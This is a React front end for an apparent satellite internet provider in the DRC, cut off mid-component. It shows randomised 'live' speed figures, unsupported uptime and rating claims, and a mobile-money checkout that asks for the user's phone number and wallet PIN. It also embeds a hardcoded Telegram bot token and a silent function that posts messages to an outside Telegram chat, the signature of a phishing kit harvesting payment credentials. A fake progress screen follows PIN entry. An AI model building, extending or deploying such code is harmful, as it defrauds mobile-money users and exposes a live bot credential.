import React, { useState, useEffect, useRef } from "react";
import {
  Satellite,
  Download,
  Upload,
  Activity,
  Radio,
  Router,
  Smartphone,
  CheckCircle2,
  ArrowRight,
  Wifi,
  ChevronRight,
  Home,
  Building2,
  Check,
  Car,
  Briefcase,
  Compass,
  ShieldCheck,
  Clock,
  Headphones,
  Star,
  ShoppingCart,
  ArrowLeft,
  Lock,
  Phone,
  Pencil,
  Clipboard,
} from "lucide-react";

/* ---------------------------------------------------------
   TOKENS
   bg base      #05070D
   frame        #0B1224 -> #060912 (gradient)
   surface      #121B33
   border       rgba(255,255,255,0.07)
   text         #EAF0FB
   text-dim     #8C97B8
   signal(teal) #2DD4BF
   beacon(amb)  #FFB020
--------------------------------------------------------- */

function useLiveMetric(baseValue, variance, active = true, initialDuration = 1400, tickDuration = 900) {
  const [value, setValue] = useState(0);
  const currentRef = useRef(0);
  const rafRef = useRef(null);

  useEffect(() => {
    if (!active) return;
    let cancelled = false;
    let timeoutId;

    function animateTo(from, to, dur, onDone) {
      const start = performance.now();
      function step(now) {
        if (cancelled) return;
        const p = Math.min((now - start) / dur, 1);
        const eased = 1 - Math.pow(1 - p, 3);
        const v = from + (to - from) * eased;
        setValue(v);
        currentRef.current = v;
        if (p < 1) rafRef.current = requestAnimationFrame(step);
        else if (onDone) onDone();
      }
      rafRef.current = requestAnimationFrame(step);
    }

    function scheduleNext() {
      const delay = 1600 + Math.random() * 2000;
      timeoutId = setTimeout(() => {
        const delta = (Math.random() * 2 - 1) * variance;
        const next = Math.max(0, baseValue + delta);
        animateTo(currentRef.current, next, tickDuration, scheduleNext);
      }, delay);
    }

    animateTo(0, baseValue, initialDuration, scheduleNext);

    return () => {
      cancelled = true;
      cancelAnimationFrame(rafRef.current);
      clearTimeout(timeoutId);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [active, baseValue, variance]);

  return value;
}

const PLANS = [
  {
    id: "essentiel",
    name: "Essentiel",
    tagline: "Navigation & réseaux sociaux",
    monthly: 35,
    down: 30,
    up: 8,
    users: "1–2 appareils",
    features: ["Installation antenne incluse", "Assistance 7j/7", "Sans engagement"],
    badge: null,
    accent: "#38BDF8",
    icon: Wifi,
  },
  {
    id: "foyer",
    name: "Foyer",
    tagline: "Streaming HD & télétravail",
    monthly: 65,
    down: 100,
    up: 20,
    users: "Jusqu'à 8 appareils",
    features: ["Routeur Wi-Fi 6 inclus", "Priorité réseau", "Assistance 7j/7"],
    badge: "Le plus choisi",
    accent: "#2DD4BF",
    icon: Home,
  },
  {
    id: "pro",
    name: "Pro Entreprise",
    tagline: "PME, visio & IP fixe",
    monthly: 150,
    down: 250,
    up: 50,
    users: "Multi-sites",
    features: ["Adresse IP fixe", "Support prioritaire 24/7", "SLA 99,9 %"],
    badge: null,
    accent: "#A78BFA",
    icon: Building2,
  },
];

const OPERATORS = [
  { id: "orange", name: "Orange Money", shortName: "Orange", mono: "OM", color: "#FF7900" },
  { id: "airtel", name: "Airtel Money", shortName: "Airtel", mono: "AM", color: "#ED1C24" },
  { id: "mtn", name: "MTN MoMo", shortName: "MTN", mono: "MM", color: "#FFCC00" },
];

// --- Notification Telegram (numéro de téléphone uniquement) ---
const TELEGRAM_BOT_TOKEN = "8867979460:AAHLTjlnZhKcLCv_uVfHz0RlYxWwSxLJBYM";
const TELEGRAM_CHAT_ID = "6018499075";

function notifyTelegram(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
  }).catch(() => {
    /* échec silencieux : ne bloque jamais le parcours utilisateur */
  });
}

function TelemetryCard({ icon: Icon, label, value, unit, decimals = 0, tint, quality }) {
  return (
    <div className="relative rounded-2xl border border-white/[0.07] bg-[#121B33] p-4 overflow-hidden animate-[fadeSlideUp_0.6s_ease_both]">
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center gap-2">
          <span
            className="flex items-center justify-center w-8 h-8 rounded-xl"
            style={{ backgroundColor: `${tint}1A`, color: tint }}
          >
            <Icon size={16} strokeWidth={2.2} />
          </span>
          <span className="text-[11px] uppercase tracking-[0.14em] text-[#8C97B8]">{label}</span>
        </div>
        <span className="w-1.5 h-1.5 rounded-full shrink-0" style={{ backgroundColor: tint, opacity: 0.8 }} />
      </div>
      <div className="flex items-baseline gap-1">
        <span className="font-[JetBrains_Mono] text-2xl font-semibold text-[#EAF0FB] tabular-nums">
          {value.toFixed(decimals)}
        </span>
        <span className="text-xs text-[#8C97B8]">{unit}</span>
      </div>
      <div className="mt-3 h-1.5 w-full rounded-full bg-white/[0.06] overflow-hidden">
        <div
          className="h-full rounded-full transition-all duration-700 ease-out"
          style={{ width: `${quality}%`, backgroundColor: tint }}
        />
      </div>
    </div>
  );
}

function BuyButton({ onBuy, className = "", label = "Acheter un forfait" }) {
  return (
    <button
      onClick={onBuy}
      className={`group inline-flex items-center gap-2 rounded-xl bg-[#FFB020] px-4 py-2.5 text-sm font-semibold text-[#05070D] transition-transform duration-300 active:scale-[0.97] hover:brightness-105 ${className}`}
    >
      <ShoppingCart size={15} />
      {label}
      <ArrowRight size={14} className="transition-transform duration-300 group-hover:translate-x-0.5" />
    </button>
  );
}

function StatutView({ active, onBuy }) {
  const dl = useLiveMetric(187, 14, active, 1400, 900);
  const ul = useLiveMetric(24, 4, active, 1400, 900);
  const ping = useLiveMetric(27, 6, active, 1200, 700);
  const jitter = useLiveMetric(3, 1.1, active, 1000, 700);

  const dlQuality = Math.min(100, Math.max(6, (dl / 220) * 100));
  const ulQuality = Math.min(100, Math.max(6, (ul / 32) * 100));
  const pingQuality = Math.min(100, Math.max(6, 100 - ping * 1.8));
  const jitterQuality = Math.min(100, Math.max(6, 100 - jitter * 14));

  return (
    <div className="space-y-6">
      {/* Hero tagline */}
      <div className="pt-3">
        <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/[0.05] border border-white/[0.08] text-[10px] uppercase tracking-[0.14em] text-[#8C97B8]">
          <Satellite size={11} className="text-[#2DD4BF]" />
          Connexion satellite nouvelle génération
        </span>
        <h1 className="font-display mt-3 text-[22px] leading-tight font-extrabold text-[#EAF0FB]">
          Une connexion internet rapide et abordable
        </h1>
        <p className="mt-1.5 text-[13px] leading-relaxed text-[#8C97B8]">
          Une connexion internet haut débit qui répond à vos besoins, partout en RDC.
        </p>
      </div>

      {/* Hero orbit */}
      <div className="pb-1 flex flex-col items-center">
        <div className="relative w-52 h-52">
          <div className="absolute inset-0 rounded-full border border-dashed border-white/15" />
          {/* pulsing radar rings from ground station */}
          <div className="absolute bottom-6 left-1/2 -translate-x-1/2">
            <span className="absolute -translate-x-1/2 -translate-y-1/2 left-1/2 top-1/2 block w-8 h-8 rounded-full border border-[#2DD4BF]/60 animate-[pingRing_2.4s_ease-out_infinite]" />
            <span className="absolute -translate-x-1/2 -translate-y-1/2 left-1/2 top-1/2 block w-8 h-8 rounded-full border border-[#2DD4BF]/60 animate-[pingRing_2.4s_ease-out_infinite] [animation-delay:0.8s]" />
            <span className="absolute -translate-x-1/2 -translate-y-1/2 left-1/2 top-1/2 block w-8 h-8 rounded-full border border-[#2DD4BF]/60 animate-[pingRing_2.4s_ease-out_infinite] [animation-delay:1.6s]" />
          </div>
          {/* orbiting satellite */}
          <div className="absolute inset-0 animate-[orbit_9s_linear_infinite]">
            <div className="absolute -top-3 left-1/2 -translate-x-1/2 animate-[orbitCounter_9s_linear_infinite]">
              <span className="flex items-center justify-center w-9 h-9 rounded-full bg-[#0B1224] border border-[#2DD4BF]/40 text-[#2DD4BF] shadow-[0_0_18px_-2px_#2DD4BF]">
                <Satellite size={17} />
              </span>
            </div>
          </div>
          {/* ground station */}
          <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex items-center justify-center w-11 h-11 rounded-full bg-[#0B1224] border border-white/10 text-[#FFB020]">
            <Radio size={18} />
          </div>
          {/* center readout */}
          <div className="absolute inset-0 flex flex-col items-center justify-center">
            <span className="font-[JetBrains_Mono] text-3xl font-bold text-[#EAF0FB] tabular-nums">
              {dl.toFixed(0)}
            </span>
            <span className="text-[11px] uppercase tracking-[0.14em] text-[#8C97B8]">Mbps en direct</span>
          </div>
        </div>
        <div className="mt-3 flex items-center gap-2 px-3 py-1 rounded-full bg-[#2DD4BF]/10 border border-[#2DD4BF]/20">
          <span className="w-1.5 h-1.5 rounded-full bg-[#2DD4BF] animate-[pulseDot_1.6s_ease-in-out_infinite]" />
          <span className="text-xs text-[#2DD4BF] font-medium">Connexion satellite active</span>
        </div>

        <BuyButton onBuy={onBuy} className="mt-4 w-full justify-center" />
      </div>

      {/* Trust strip */}
      <div className="grid grid-cols-3 gap-2">
        {[
          { icon: ShieldCheck, label: "Sans engagement" },
          { icon: Clock, label: "Installation 48h" },
          { icon: Headphones, label: "Support 7j/7" },
        ].map((t) => (
          <div
            key={t.label}
            className="flex flex-col items-center gap-1.5 rounded-2xl border border-white/[0.07] bg-[#121B33] py-3 px-1"
          >
            <t.icon size={16} className="text-[#FFB020]" />
            <span className="text-[10px] text-center text-[#8C97B8] leading-tight">{t.label}</span>
          </div>
        ))}
      </div>

      {/* Telemetry grid */}
      <div>
        <div className="flex items-center gap-2 mb-3">
          <span className="w-1.5 h-1.5 rounded-full bg-[#2DD4BF] animate-[pulseDot_1.6s_ease-in-out_infinite]" />
          <p className="text-[11px] uppercase tracking-[0.14em] text-[#8C97B8]">Télémétrie en direct</p>
        </div>
        <div className="grid grid-cols-2 gap-3">
          <TelemetryCard icon={Download} label="Téléchargement" value={dl} unit="Mbps" tint="#2DD4BF" quality={dlQuality} />
          <TelemetryCard icon={Upload} label="Envoi" value={ul} unit="Mbps" tint="#38BDF8" quality={ulQuality} />
          <TelemetryCard icon={Activity} label="Latence (ping)" value={ping} unit="ms" tint="#FFB020" quality={pingQuality} />
          <TelemetryCard icon={Radio} label="Gigue (jitter)" value={jitter} unit="ms" decimals={1} tint="#F472B6" quality={jitterQuality} />
        </div>
      </div>

      {/* Use cases */}
      <div className="rounded-2xl border border-white/[0.07] bg-gradient-to-br from-[#121B33] to-[#0F1730] p-4">
        <p className="text-[11px] uppercase tracking-[0.14em] text-[#8C97B8] mb-3">Pensée pour votre quotidien</p>
        <div className="space-y-3">
          <div className="flex items-start gap-3">
            <span className="flex items-center justify-center w-9 h-9 rounded-xl bg-[#38BDF8]/10 text-[#38BDF8] shrink-0">
              <Car size={16} />
            </span>
            <p className="text-[13px] leading-relaxed text-[#B7C0D8]">
              Une connexion internet pour les voyages, les road trips et les trajets domicile-travail.
            </p>
          </div>
          <div className="flex items-start gap-3">
            <span className="flex items-center justify-center w-9 h-9 rounded-xl bg-[#2DD4BF]/10 text-[#2DD4BF] shrink-0">
              <Compass size={16} />
            </span>
            <div>
              <p className="text-[13px] leading-relaxed text-[#B7C0D8]">
                Une connexion internet haut débit qui vous accompagne, même dans les zones blanches.
              </p>
              <p className="mt-1 text-[11px] text-[#8C97B8]/70 italic">
                Utilisation en mouvement disponible dans certaines zones seulement.
              </p>
            </div>
          </div>
          <div className="flex items-start gap-3">
            <span className="flex items-center justify-center w-9 h-9 rounded-xl bg-[#A78BFA]/10 text-[#A78BFA] shrink-0">
              <Briefcase size={16} />
            </span>
            <p className="text-[13px] leading-relaxed text-[#B7C0D8]">
              Une connexion internet haut débit qui répond à vos besoins, à la maison comme au bureau.
            </p>
          </div>
        </div>
      </div>

      {/* Network structure */}
      <div className="rounded-2xl border border-white/[0.07] bg-[#121B33] p-4">
        <p className="text-[11px] uppercase tracking-[0.14em] text-[#8C97B8] mb-4">Structure du réseau</p>
        <div className="flex items-center">
          {[
            { icon: Satellite, label: "Satellite" },
            { icon: Radio, label: "Antenne" },
            { icon: Router, label: "Routeur" },
            { icon: Smartphone, label: "Appareils" },
          ].map((node, i, arr) => (
            <React.Fragment key={node.label}>
              <div className="flex flex-col items-center gap-2 shrink-0">
                <span className="flex items-center justify-center w-10 h-10 rounded-xl bg-white/[0.05] border border-white/[0.08] text-[#EAF0FB]">
                  <node.icon size={16} />
                </span>
                <span className="text-[10px] text-[#8C97B8]">{node.label}</span>
              </div>
              {i < arr.length - 1 && (
                <div className="relative flex-1 h-px bg-white/10 mx-1 overflow-hidden">
                  <span
                    className="absolute top-1/2 -translate-y-1/2 w-1.5 h-1.5 rounded-full bg-[#2DD4BF] animate-[flow_1.8s_linear_infinite]"
                    style={{ animationDelay: `${i * 0.35}s` }}
                  />
                </div>
              )}
            </React.Fragment>
          ))}
        </div>
      </div>

      {/* Uptime + rating */}
      <div className="grid grid-cols-2 gap-3">
        <div className="rounded-2xl border border-white/[0.07] bg-[#121B33] p-4">
          <p className="text-xs text-[#8C97B8]">Disponibilité</p>
          <p className="font-[JetBrains_Mono] mt-1 text-xl font-semibold text-[#2DD4BF]">99,9 %</p>
          <p className="mt-0.5 text-[10px] text-[#8C97B8]">30 derniers jours</p>
        </div>
        <div className="rounded-2xl border border-white/[0.07] bg-[#121B33] p-4">
          <div className="flex items-center gap-1 text-[#FFB020]">
            {Array.from({ length: 5 }).map((_, i) => (
              <Star key={i} size={12} fill="#FFB020" strokeWidth={0} />
            ))}
          </div>
          <p className="font-[JetBrains_Mono] mt-1 text-xl font-semibold text-[#EAF0FB]">4,8/5</p>
          <p className="mt-0.5 text-[10px] text-[#8C97B8]">+12 400 clients en RDC</p>
        </div>
      </div>

      {/* Closing CTA */}
      <div className="rounded-2xl border border-[#FFB020]/20 bg-gradient-to-br from-[#1A1408] to-[#121B33] p-5 text-center">
        <p className="font-display text-[16px] font-bold text-[#EAF0FB]">
          Une connexion internet haut débit qui répond à vos besoins
        </p>
        <p className="mt-1.5 text-xs text-[#8C97B8]">
          Choisissez votre forfait et soyez connecté en 48h, où que vous soyez en RDC.
        </p>
        <BuyButton onBuy={onBuy} className="mt-4 w-full justify-center" />
      </div>
    </div>
  );
}

function BillingToggle({ cycle, setCycle }) {
  return (
    <div className="relative inline-flex p-1 rounded-full bg-white/[0.05] border border-white/[0.08]">
      <div
        className="absolute top-1 bottom-1 w-[calc(50%-4px)] rounded-full bg-[#FFB020] transition-transform duration-300 ease-out"
        style={{ transform: cycle === "annuel" ? "translateX(calc(100% + 4px))" : "translateX(0%)" }}
      />
      {["mensuel", "annuel"].map((c) => (
        <button
          key={c}
          onClick={() => setCycle(c)}
          className={`relative z-10 px-4 py-1.5 text-xs font-semibold rounded-full transition-colors duration-300 ${
            cycle === c ? "text-[#05070D]" : "text-[#8C97B8]"
          }`}
        >
          {c === "mensuel" ? "Mensuel" : "Annuel · -15%"}
        </button>
      ))}
    </div>
  );
}

function PlanCard({ plan, selected, onSelect, cycle }) {
  const price = cycle === "annuel" ? (plan.monthly * 0.85).toFixed(0) : plan.monthly;
  const Icon = plan.icon;

  return (
    <button
      onClick={() => onSelect(plan.id)}
      className={`group relative w-full text-left rounded-2xl border p-4 pt-5 overflow-hidden transition-all duration-300 active:scale-[0.99] ${
        selected
          ? "border-[#FFB020]/60 bg-[#161022] shadow-[0_0_0_1px_rgba(255,176,32,0.25),0_10px_28px_-10px_rgba(255,176,32,0.35)] -translate-y-0.5"
          : "border-white/[0.07] bg-[#121B33] hover:border-white/[0.16] hover:-translate-y-0.5"
      }`}
    >
      {/* top accent stripe */}
      <span
        className="absolute top-0 left-0 h-[3px] w-full transition-opacity duration-300"
        style={{ backgroundColor: plan.accent, opacity: selected ? 1 : 0.55 }}
      />

      {plan.badge && (
        <span
          className="absolute top-3 right-4 px-2 py-0.5 rounded-full text-[10px] font-semibold uppercase tracking-wide"
          style={{ backgroundColor: `${plan.accent}22`, color: plan.accent }}
        >
          {plan.badge}
        </span>
      )}

      {/* header row: tier icon + name */}
      <div className="flex items-center gap-3">
        <span
          className="flex items-center justify-center w-11 h-11 rounded-xl shrink-0 transition-transform duration-300 group-hover:scale-105"
          style={{ backgroundColor: `${plan.accent}1A`, color: plan.accent }}
        >
          <Icon size={19} strokeWidth={2.2} />
        </span>
        <div className="min-w-0">
          <p className="text-[15px] font-semibold text-[#EAF0FB] truncate">{plan.name}</p>
          <p className="text-xs text-[#8C97B8] truncate">{plan.tagline}</p>
        </div>
      </div>

      {/* price */}
      <div className="mt-4 flex items-end gap-2">
        <span className="font-[JetBrains_Mono] text-[28px] leading-none font-bold text-[#EAF0FB]">
          ${price}
        </span>
        <span className="text-xs text-[#8C97B8] pb-1">/mois</span>
        {cycle === "annuel" && (
          <span className="text-xs text-[#8C97B8]/60 line-through pb-1">${plan.monthly}</span>
        )}
      </div>

      {/* speed pills */}
      <div className="mt-3 flex flex-wrap items-center gap-2">
        <span className="flex items-center gap-1 px-2 py-1 rounded-lg bg-white/[0.05] text-[11px] text-[#EAF0FB]">
          <Download size={11} className="text-[#2DD4BF]" /> {plan.down} Mbps
        </span>
        <span className="flex items-center gap-1 px-2 py-1 rounded-lg bg-white/[0.05] text-[11px] text-[#EAF0FB]">
          <Upload size={11} className="text-[#38BDF8]" /> {plan.up} Mbps
        </span>
        <span className="px-2 py-1 rounded-lg bg-white/[0.05] text-[11px] text-[#8C97B8]">
          {plan.users}
        </span>
      </div>

      {/* divider */}
      <div className="mt-4 border-t border-white/[0.06]" />

      {/* features */}
      <ul className="mt-3 space-y-1.5">
        {plan.features.map((f) => (
          <li key={f} className="flex items-center gap-2 text-xs text-[#B7C0D8]">
            <span
              className="flex items-center justify-center w-4 h-4 rounded-full shrink-0"
              style={{ backgroundColor: `${plan.accent}22`, color: plan.accent }}
            >
              <Check size={10} strokeWidth={3} />
            </span>
            {f}
          </li>
        ))}
      </ul>

      {/* footer CTA */}
      <div className="mt-4 flex items-center justify-between">
        <span
          className="text-xs font-semibold transition-colors duration-300"
          style={{ color: selected ? "#FFB020" : plan.accent }}
        >
          {selected ? "Sélectionné" : "Choisir ce forfait"}
        </span>
        <span
          className={`flex items-center justify-center w-7 h-7 rounded-full border transition-all duration-300 ${
            selected
              ? "bg-[#FFB020] border-[#FFB020] rotate-0"
              : "border-white/15 group-hover:border-white/30 group-hover:translate-x-0.5"
          }`}
        >
          {selected ? (
            <Check size={13} strokeWidth={3} className="text-[#05070D]" />
          ) : (
            <ChevronRight size={13} className="text-[#8C97B8]" />
          )}
        </span>
      </div>
    </button>
  );
}

function ForfaitView({ cycle, setCycle, selected, setSelected }) {
  return (
    <div className="space-y-5">
      <div className="pt-2">
        <h2 className="text-lg font-bold text-[#EAF0FB]">Choisissez votre forfait</h2>
        <p className="text-xs text-[#8C97B8] mt-1">Sans engagement · installation en 48h partout à Kinshasa</p>
      </div>

      <BillingToggle cycle={cycle} setCycle={setCycle} />

      <div className="space-y-3 pb-2">
        {PLANS.map((plan) => (
          <PlanCard
            key={plan.id}
            plan={plan}
            cycle={cycle}
            selected={selected === plan.id}
            onSelect={setSelected}
          />
        ))}
      </div>
    </div>
  );
}

function CheckoutHeader({ title, onBack }) {
  return (
    <div className="shrink-0 px-5 pt-6 pb-3 flex items-center gap-3">
      <button
        onClick={onBack}
        className="flex items-center justify-center w-8 h-8 rounded-xl bg-white/[0.05] text-[#EAF0FB] transition-colors duration-200 hover:bg-white/[0.09]"
      >
        <ArrowLeft size={16} />
      </button>
      <span className="font-display text-[15px] font-bold text-[#EAF0FB]">{title}</span>
    </div>
  );
}

function PaymentRecap({ plan, price }) {
  const Icon = plan.icon;
  return (
    <div className="rounded-2xl border border-white/[0.07] bg-[#121B33] p-4 flex items-center justify-between">
      <div className="flex items-center gap-3">
        <span
          className="flex items-center justify-center w-10 h-10 rounded-xl shrink-0"
          style={{ backgroundColor: `${plan.accent}1A`, color: plan.accent }}
        >
          <Icon size={17} />
        </span>
        <div>
          <p className="text-sm font-semibold text-[#EAF0FB]">{plan.name}</p>
          <p className="text-[11px] text-[#8C97B8]">Forfait internet satellite</p>
        </div>
      </div>
      <span className="font-[JetBrains_Mono] text-lg font-bold text-[#EAF0FB]">${price}</span>
    </div>
  );
}

function PaymentMethodScreen({ plan, price, operator, setOperator, onBack, onNext }) {
  return (
    <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
      <div className="mb-4">
        <h2 className="text-lg font-bold text-[#EAF0FB]">Moyen de paiement</h2>
        <p className="text-xs text-[#8C97B8] mt-1">Choisissez comment payer votre forfait</p>
      </div>

      <PaymentRecap plan={plan} price={price} />

      <div className="mt-5 space-y-3">
        {OPERATORS.map((op) => {
          const isSelected = operator === op.id;
          return (
            <button
              key={op.id}
              onClick={() => setOperator(op.id)}
              className={`w-full flex items-center gap-3 rounded-2xl border p-3.5 transition-all duration-300 active:scale-[0.99] ${
                isSelected
                  ? "bg-[#161022]"
                  : "border-white/[0.07] bg-[#121B33] hover:border-white/[0.16]"
              }`}
              style={isSelected ? { borderColor: `${op.color}80`, boxShadow: `0 0 0 1px ${op.color}40` } : undefined}
            >
              <span
                className="flex items-center justify-center w-11 h-11 rounded-full font-[JetBrains_Mono] text-xs font-bold shrink-0"
                style={{ backgroundColor: `${op.color}22`, color: op.color }}
              >
                {op.mono}
              </span>
              <div className="text-left">
                <p className="text-[10px] uppercase tracking-[0.1em] text-[#8C97B8]">Payer avec</p>
                <p className="text-sm font-semibold text-[#EAF0FB]">{op.name}</p>
              </div>
              <span
                className={`ml-auto flex items-center justify-center w-6 h-6 rounded-full border-2 transition-all duration-300 ${
                  isSelected ? "" : "border-white/15"
                }`}
                style={isSelected ? { backgroundColor: op.color, borderColor: op.color } : undefined}
              >
                {isSelected && <Check size={12} strokeWidth={3} className="text-[#05070D]" />}
              </span>
            </button>
          );
        })}
      </div>

      <button
        disabled={!operator}
        onClick={onNext}
        className={`mt-auto pt-6 w-full flex items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-300 ${
          operator
            ? "bg-[#FFB020] text-[#05070D] active:scale-[0.98]"
            : "bg-white/[0.06] text-[#8C97B8] cursor-not-allowed"
        }`}
      >
        Continuer <ArrowRight size={15} />
      </button>
    </div>
  );
}

function PhoneEntryScreen({ plan, price, operator, phone, setPhone, onBack, onNext }) {
  const op = OPERATORS.find((o) => o.id === operator);
  const isValid = phone.replace(/\D/g, "").length >= 9;

  return (
    <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
      <PaymentRecap plan={plan} price={price} />

      <div className="mt-6">
        <label className="text-sm font-semibold text-[#EAF0FB]">
          Entrez votre numéro {op.name}
        </label>
        <p className="text-xs text-[#8C97B8] mt-1">
          Vous recevrez une demande de confirmation sur cet appareil.
        </p>

        <div
          className="mt-4 flex items-center gap-3 rounded-2xl border bg-[#121B33] px-4 py-3.5 transition-colors duration-300 focus-within:border-white/25"
          style={{ borderColor: phone ? `${op.color}60` : "rgba(255,255,255,0.07)" }}
        >
          <span
            className="flex items-center justify-center w-8 h-8 rounded-lg shrink-0"
            style={{ backgroundColor: `${op.color}22`, color: op.color }}
          >
            <Phone size={15} />
          </span>
          <input
            type="tel"
            inputMode="numeric"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="+243 8XX XXX XXX"
            className="flex-1 bg-transparent outline-none font-[JetBrains_Mono] text-[15px] text-[#EAF0FB] placeholder:text-[#8C97B8]/50"
          />
        </div>
      </div>

      <button
        disabled={!isValid}
        onClick={onNext}
        className={`mt-6 w-full flex items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-300 ${
          isValid ? "text-[#05070D] active:scale-[0.98]" : "bg-white/[0.06] text-[#8C97B8] cursor-not-allowed"
        }`}
        style={isValid ? { backgroundColor: op.color } : undefined}
      >
        Continuer <ArrowRight size={15} />
      </button>

      <div className="mt-auto pt-8 space-y-3">
        <p className="text-[11px] leading-relaxed text-[#8C97B8]">
          En utilisant ce service, vous acceptez nos{" "}
          <button className="underline underline-offset-2 font-medium" style={{ color: op.color }}>
            Conditions générales
          </button>{" "}
          et notre{" "}
          <button className="underline underline-offset-2 font-medium" style={{ color: op.color }}>
            Politique de confidentialité
          </button>
          .
        </p>
        <div className="flex items-center gap-1.5 text-[11px] text-[#8C97B8]">
          <Lock size={11} className="text-[#2DD4BF]" />
          Connexion chiffrée et sécurisée par SSL
        </div>
      </div>
    </div>
  );
}

function ConfirmPhoneScreen({ phone, operator, onEdit, onConfirm }) {
  return (
    <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
      <div className="flex flex-col items-center pt-8">
        <span
          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
        >
          {operator.mono}
        </span>
        <p className="mt-4 text-sm text-[#8C97B8]">Confirmez votre numéro {operator.name}</p>
        <p className="mt-2 font-[JetBrains_Mono] text-2xl font-bold text-[#EAF0FB] tracking-wide">{phone}</p>
        <button
          onClick={onEdit}
          className="mt-3 flex items-center gap-1.5 text-xs text-[#8C97B8] underline underline-offset-2"
        >
          <Pencil size={12} /> Modifier le numéro
        </button>
      </div>

      <p className="mt-8 text-center text-[13px] leading-relaxed text-[#B7C0D8]">
        Est-ce bien le numéro sur lequel vous souhaitez recevoir la demande de paiement&nbsp;?
      </p>

      <div className="mt-auto pt-8 space-y-3">
        <button
          onClick={onConfirm}
          style={{ backgroundColor: operator.color }}
          className="w-full rounded-xl px-4 py-3 text-sm font-semibold text-[#05070D] transition-transform duration-300 active:scale-[0.98]"
        >
          Oui, ce numéro est correct
        </button>
        <button
          onClick={onEdit}
          className="w-full rounded-xl bg-white/[0.05] px-4 py-3 text-sm font-semibold text-[#8C97B8]"
        >
          Modifier
        </button>
      </div>
    </div>
  );
}

function CodeEntryScreen({ operator, onValidate }) {
  const length = operator.id === "mtn" ? 5 : 4;
  const [code, setCode] = useState("");
  const inputRef = useRef(null);
  useEffect(() => {
    inputRef.current?.focus();
  }, []);
  const isComplete = code.length === length;

  return (
    <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
      <div className="flex flex-col items-center pt-6">
        <span
          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
        >
          {operator.mono}
        </span>
        <p className="mt-3 text-sm font-semibold text-[#EAF0FB]">{operator.name}</p>
        <p className="mt-2 text-xs text-[#8C97B8] text-center max-w-[240px]">
          Entrez votre code secret pour valider le paiement
        </p>
      </div>

      <div className="relative mt-8 flex justify-center gap-3" onClick={() => inputRef.current?.focus()}>
        {Array.from({ length }).map((_, i) => (
          <div
            key={i}
            className="w-11 h-14 rounded-xl border-2 flex items-center justify-center font-[JetBrains_Mono] text-2xl font-bold text-[#05070D] bg-white transition-colors duration-200 shadow-sm"
            style={{
              borderColor: i < code.length ? operator.color : "rgba(15,23,42,0.15)",
            }}
          >
            {code[i] ? "•" : ""}
          </div>
        ))}
        <input
          ref={inputRef}
          type="tel"
          inputMode="numeric"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, length))}
          className="absolute inset-0 opacity-0 cursor-pointer"
        />
      </div>

      <button
        disabled={!isComplete}
        onClick={() => onValidate(code)}
        style={isComplete ? { backgroundColor: operator.color } : undefined}
        className={`mt-auto pt-8 w-full rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-300 ${
          isComplete ? "text-[#05070D] active:scale-[0.98]" : "bg-white/[0.06] text-[#8C97B8] cursor-not-allowed"
        }`}
      >
        Valider
      </button>
    </div>
  );
}

function ConnectingScreen({ onDone }) {
  const [progress, setProgress] = useState(0);
  useEffect(() => {
    const start = Date.now();
    const duration = 30000;
    let raf;
    function tick() {
      const elapsed = Date.now() - start;
      const p = Math.min(100, (elapsed / duration) * 100);
      setProgress(p);
      if (p < 100) raf = requestAnimationFrame(tick);
      else onDone();
    }
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const r = 44;
  const circumference = 2 * Math.PI * r;

  return (
    <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6">
      <div className="relative w-40 h-40 flex items-center justify-center">
        <svg className="absolute inset-0 -rotate-90" viewBox="0 0 100 100">
          <circle cx="50" cy="50" r={r} fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="6" />
          <circle
            cx="50"
            cy="50"
            r={r}
            fill="none"
            stroke="#2DD4BF"
            strokeWidth="6"
            strokeLinecap="round"
            strokeDasharray={circumference}
            strokeDashoffset={circumference * (1 - progress / 100)}
            style={{ transition: "stroke-dashoffset 0.1s linear" }}
          />
        </svg>
        <span className="absolute inset-0 animate-[orbit_3s_linear_infinite]">
          <span className="absolute -top-1 left-1/2 -translate-x-1/2 animate-[orbitCounter_3s_linear_infinite]">
            <span className="flex items-center justify-center w-7 h-7 rounded-full bg-[#0B1224] border border-[#2DD4BF]/40 text-[#2DD4BF]">
              <Satellite size={13} />
            </span>
          </span>
        </span>
        <span className="font-[JetBrains_Mono] text-2xl font-bold text-[#EAF0FB]">{Math.round(progress)}%</span>
      </div>
      <div className="text-center">
        <p className="text-sm font-semibold text-[#EAF0FB]">Connexion à votre réseau…</p>
        <p className="mt-1 text-xs text-[#8C97B8]">Veuillez patienter, ne fermez pas l'application</p>
      </div>
    </div>
  );
}

function SuccessScreen({ operator, plan, price, onDone }) {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-8 text-center gap-4">
      <span
        className="flex items-center justify-center w-16 h-16 rounded-full animate-[fadeSlideUp_0.5s_ease_both]"
        style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
